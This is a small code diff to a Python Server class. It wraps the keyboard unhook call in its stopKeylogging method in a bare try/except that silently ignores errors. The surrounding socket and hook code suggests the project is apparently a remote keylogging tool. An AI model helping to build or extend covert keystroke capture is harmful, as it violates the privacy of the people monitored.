@@ -258,7 +258,10 @@ class Server(object):
         keyboard.wait()
     #TODO: Unhook
     def stopKeylogging(self):
-        keyboard.unhook(self.__callback)
+        try:
+            keyboard.unhook(self.__callback)
+        except:
+            pass
     def Close(self):
         s.close()
         close_it=threading.Thread(target=self.root.destroy,daemon=True)
